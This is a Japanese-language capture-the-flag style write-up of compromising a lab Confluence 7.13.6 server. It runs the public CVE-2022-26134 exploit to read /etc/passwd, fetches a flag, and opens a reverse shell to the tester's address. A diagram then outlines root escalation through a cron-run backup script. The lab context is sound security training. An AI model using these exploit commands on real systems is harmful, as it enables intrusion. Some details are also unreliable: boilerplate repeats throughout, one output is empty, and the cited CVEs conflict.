## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | Web application and exposed network services |
| 主な侵入経路 | Web RCE (CVE-2022-26134, CVE-2023-22527) |
| 権限昇格経路 | Local enumeration -> misconfiguration abuse -> root |

## 認証情報

認証情報なし。

## 偵察

---
💡 なぜ有効か  
This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.

## 初期足がかり

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
nc -vn $ip 8091
```

```bash
❌[4:03][CPU:6][MEM:66][TUN0:192.168.45.178][/home/n0z0]
🐉 > nc -vn $ip 8091
(UNKNOWN) [192.168.200.41] 8091 (?) open
```


*キャプション：このフェーズで取得したスクリーンショット*

https://github.com/jbaines-r7/through_the_wire

*キャプション：このフェーズで取得したスクリーンショット*

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
python3 through_the_wire.py --rhost $ip --rport 8090 --lhost 192.168.45.178 --protocol http:// --read-file /etc/passwd
```

```bash
❌[4:56][CPU:2][MEM:74][TUN0:192.168.45.178][...ound/Flu/through_the_wire]
🐉 > python3 through_the_wire.py --rhost $ip --rport 8090 --lhost 192.168.45.178 --protocol http:// --read-file /etc/passwd
   _____ _                           _
  /__   \ |__  _ __ ___  _   _  __ _| |__
    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \
   / /  | | | | | | (_) | |_| | (_| | | | |
   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|
                               |___/
   _____ _            __    __ _
  /__   \ |__   ___  / / /\ \ (_)_ __ ___
    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \
   / /  | | | |  __/  \  /\  /| | | |  __/
   \/   |_| |_|\___|   \/  \/ |_|_|  \___|

                 jbaines-r7
               CVE-2022-26134
      "Spit my soul through the wire"
                     🦞

[+] Forking a netcat listener
[+] Using /usr/bin/nc
[+] Generating a payload to read: /etc/passwd
[+] Sending expoit at http://192.168.200.41:8090/
listening on [any] 1270 ...
connect to [192.168.45.178] from (UNKNOWN) [192.168.200.41] 55040
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:106::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:101:1::/var/cache/pollinate:/bin/false
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
syslog:x:103:109::/nonexistent:/usr/sbin/nologin
uuidd:x:104:110::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:111::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:113::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:108:114:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:109:115:MySQL Server,,,:/nonexistent:/bin/false
confluence:x:1001:1001:Atlassian Confluence:/home/confluence:/bin/sh

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
python3 through_the_wire.py --rhost $ip --rport 8090 --lhost 192.168.45.178 --protocol http:// --read-file /home/confluence/local.txt
```

```bash
❌[23:59][CPU:4][MEM:67][TUN0:192.168.45.178][...ound/Flu/through_the_wire]
🐉 > python3 through_the_wire.py --rhost $ip --rport 8090 --lhost 192.168.45.178 --protocol http:// --read-file /home/confluence/local.txt
   _____ _                           _
  /__   \ |__  _ __ ___  _   _  __ _| |__
    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \
   / /  | | | | | | (_) | |_| | (_| | | | |
   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|
                               |___/
   _____ _            __    __ _
  /__   \ |__   ___  / / /\ \ (_)_ __ ___
    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \
   / /  | | | |  __/  \  /\  /| | | |  __/
   \/   |_| |_|\___|   \/  \/ |_|_|  \___|

                 jbaines-r7
               CVE-2022-26134
      "Spit my soul through the wire"
                     🦞

[+] Forking a netcat listener
[+] Using /usr/bin/nc
[+] Generating a payload to read: /home/confluence/local.txt
[+] Sending expoit at http://192.168.200.41:8090/
listening on [any] 1270 ...
connect to [192.168.45.178] from (UNKNOWN) [192.168.200.41] 50074
f5e9c8d27d0df787971eef5d78b338c2

```

💡 なぜ有効か  
The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.

## 権限昇格

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
python3 through_the_wire.py --rhost $ip --rport 8090 --lhost 192.168.45.178 --protocol http:// --reverse-shell
```

```bash
❌[0:04][CPU:1][MEM:68][TUN0:192.168.45.178][...ound/Flu/through_the_wire]
🐉 > python3 through_the_wire.py --rhost $ip --rport 8090 --lhost 192.168.45.178 --protocol http:// --reverse-shell
   _____ _                           _
  /__   \ |__  _ __ ___  _   _  __ _| |__
    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \
   / /  | | | | | | (_) | |_| | (_| | | | |
   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|
                               |___/
   _____ _            __    __ _
  /__   \ |__   ___  / / /\ \ (_)_ __ ___
    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \
   / /  | | | |  __/  \  /\  /| | | |  __/
   \/   |_| |_|\___|   \/  \/ |_|_|  \___|

                 jbaines-r7
               CVE-2022-26134
      "Spit my soul through the wire"
                     🦞

confluence@flu:/opt/atlassian/confluence/bin$

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
╔══════════╣ Unexpected in /opt (usually empty)
total 756692
drwxr-xr-x  3 root       root            4096 Dec 12  2023 .
drwxr-xr-x 19 root       root            4096 Dec 12  2023 ..
drwxr-xr-x  3 root       root            4096 Dec 12  2023 atlassian
-rwxr-xr-x  1 root       root       774f5e9c8d27d0df787971eef5d78b338c2829955 Dec 12  2023 atlassian-confluence-7.13.6-x64.bin
-rwxr-xr-x  1 confluence confluence       408 Dec 12  2023 log-backup.sh
```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
cat log-backup.sh
```

```bash
confluence@flu:/opt$ cat log-backup.sh


```

💡 なぜ有効か  
Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.

## まとめ・学んだこと

- 本番同等の環境でフレームワークのデバッグモードとエラー露出を検証する。
- 特権ユーザーやスケジューラーが実行するスクリプト・バイナリのファイルパーミッションを制限する。
- ワイルドカード展開やスクリプト化可能な特権ツールを避けるため sudo ポリシーを強化する。
- 露出した認証情報と環境ファイルを重要機密として扱う。

### Attack Flow

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。



```mermaid
flowchart LR
    subgraph KC1["Kill Chain 1<br/>偵察"]
        direction TB
        K1A[ポートスキャン<br/>Rustscan/Nmap]
        K1B[サービス列挙<br/>22/8090/8091]
        K1C[Confluence発見<br/>Port 8090]
        K1D[バージョン特定<br/>Confluence 7.13.6]
        
        K1A --> K1B --> K1C --> K1D
    end
    
    subgraph KC2["Kill Chain 2<br/>脆弱性特定"]
        direction TB
        K2A[CVE検索<br/>CVE-2023-22527]
        K2B[脆弱性確認<br/>OGNL Injection]
        K2C[エクスプロイト選定<br/>through_the_wire.py]
        K2D[攻撃可能判定<br/>7.13.6は脆弱]
        
        K2A --> K2B --> K2C --> K2D
    end
    
    subgraph KC3["Kill Chain 3<br/>初期侵入"]
        direction TB
        K3A[OGNL Injection<br/>Template攻撃]
        K3B[ファイル読み取り<br/>/etc/passwd]
        K3C[ユーザー確認<br/>confluence発見]
        K3D[local.txt取得<br/>f5e9c8d27d0df787]
        
        K3A --> K3B --> K3C --> K3D
    end
    
    subgraph KC4["Kill Chain 4<br/>RCE取得"]
        direction TB
        K4A[through_the_wire<br/>reverse-shell]
        K4B[リスナー起動<br/>nc -lvnp 1270]
        K4C[シェル接続<br/>confluence user]
        K4D[コマンド実行<br/>uid=1001]
        
        K4A --> K4B --> K4C --> K4D
    end
    
    subgraph KC5["Kill Chain 5<br/>シェル確立"]
        direction TB
        K5A[シェル安定化<br/>python3 pty.spawn]
        K5B[環境確認<br/>id/groups]
        K5C[LinPEAS実行<br/>列挙開始]
        K5D[異常発見<br/>/opt/log-backup.sh]
        
        K5A --> K5B --> K5C --> K5D
    end
    
    subgraph KC6["Kill Chain 6<br/>権限昇格準備"]
        direction TB
        K6A[スクリプト発見<br/>log-backup.sh]
        K6B[所有者確認<br/>confluence所有]
        K6C[内容分析<br/>cat log-backup.sh]
        K6D[root領域アクセス<br/>/root/backup]
        
        K6A --> K6B --> K6C --> K6D
    end
    
    subgraph KC7["Kill Chain 7<br/>プロセス監視"]
        direction TB
        K7A[pspy64デプロイ<br/>wget/chmod]
        K7B[プロセス監視<br/>./pspy64]
        K7C[UID=0検出<br/>root実行確認]
        K7D[cron確定<br/>毎分実行]
        
        K7A --> K7B --> K7C --> K7D
    end
    
    subgraph KC8["Kill Chain 8<br/>権限昇格"]
        direction TB
        K8A[ペイロード追加<br/>echo >> script]
        K8B[リスナー起動<br/>nc -lvnp 9001]
        K8C[cron実行待機<br/>最大1分]
        K8D[rootシェル取得<br/>uid=0 gid=0]
        
        K8A --> K8B --> K8C --> K8D
    end
    
    subgraph KC9["Kill Chain 9<br/>目標達成"]
        direction TB
        K9A[完全制御<br/>root access]
        K9B[proof.txt取得<br/>9982d1e269c9241e]
        K9C[crontab確認<br/>* * * * *]
        K9D[完了<br/>Mission Success]
        
        K9A --> K9B --> K9C --> K9D
    end
    
    KC1 ==> KC2 ==> KC3 ==> KC4 ==> KC5 ==> KC6 ==> KC7 ==> KC8 ==> KC9
    
    style KC1 fill:#e8eaf6
    style KC2 fill:#fff9c4
    style KC3 fill:#ffccbc
    style KC4 fill:#f8bbd0
    style KC5 fill:#c8e6c9
    style KC6 fill:#b2dfdb
    style KC7 fill:#81d4fa
    style KC8 fill:#ff9800
    style KC9 fill:#4caf50
    style K8D fill:#ff6b6b,color:#fff
    style K9D fill:#2196f3,color:#fff
```

## 参考文献

- CVE-2022-26134: https://nvd.nist.gov/vuln/detail/CVE-2022-26134
- CVE-2023-22527: https://nvd.nist.gov/vuln/detail/CVE-2023-22527
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
